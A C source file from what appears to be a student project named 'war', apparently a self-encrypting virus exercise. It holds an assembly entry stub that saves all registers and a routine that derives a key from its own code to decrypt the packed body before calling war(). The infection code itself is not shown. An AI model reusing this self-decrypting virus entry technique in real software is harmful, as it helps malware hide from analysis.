/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cypher_beg.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 15:13:18 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

int		main(void)
{
	cypher_beg();
}

void	start(void)
{
	__asm__ __volatile__ (
		"push rbx;"
		"push rsp;"
		"push rbp;"
		"push rax;"
		"push rdi;"
		"push rsi;"
		"push rdx;"
		"push rcx;"
		"push r8;"
		"push r9;"
		"push r10;"
		"push r11;"
		"push r12;"
		"push r13;"
		"push r14;"
		"push r15;"
		"call cypher_beg;"
		);
}

void	cypher_beg(void)
{
	t_data	data = {0};

	// DECRYPT TEXT PACKER
	data.context = true;
	update_one(&data.key, (char*)cypher_beg, (size_t)war - (size_t)cypher_beg);
//	printf("beg key = %lx\n", data.key.one);
//	revert_one(&data.key, (char*)war, (size_t)infect - (size_t)war);
	war(&data);
}
